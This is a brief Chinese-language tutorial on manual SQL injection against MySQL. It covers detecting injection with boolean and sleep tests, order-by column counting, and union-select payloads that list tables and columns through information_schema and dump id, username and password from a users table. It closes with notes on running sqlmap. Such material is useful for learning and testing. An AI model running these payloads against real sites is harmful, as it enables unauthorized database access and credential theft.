# SQL注入实战

## 判断是否有注入点

and 1=1 / and 1=2 回显不同

and sleep（5）判断页面暂停时间（有则暂停，没有不执行语句

## 步骤

### 寻找注入点（后台代码）

### 测试注入点（and 1=1/and 1=2）

### 测试字段长度(order by 4)

### 监测回显位置(union select 1,2,3,4)

### 进行数据库表，列，列表爆破

#### 获取当前数据库名

```
-1 union select 1,2,database(),4 
```

#### 获取当前数据库表名

```
-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3，4
```

{% hint style="info" %}
information\_schema.tables是mysql存储表数据的表，固定名字
{% endhint %}

#### 获取表中字段名

```
-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='上面获取的名字'),3--+
```

{% hint style="info" %}
注意table\_name是上一步获取的名字
{% endhint %}

#### 获取数据

```
-1' union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+
```

{% hint style="info" %}
id，username，password是上一步获取的名字，0x7c是竖线，from后面是上两步获取的表名
{% endhint %}

## SQLMAP的使用

### 闪退问题解决

1.管理员进入cmd

2.进入python路径以及sqlmap路径

cd python2.7

cd sqlmap

3.使用python sqlmap.py -h执行指令
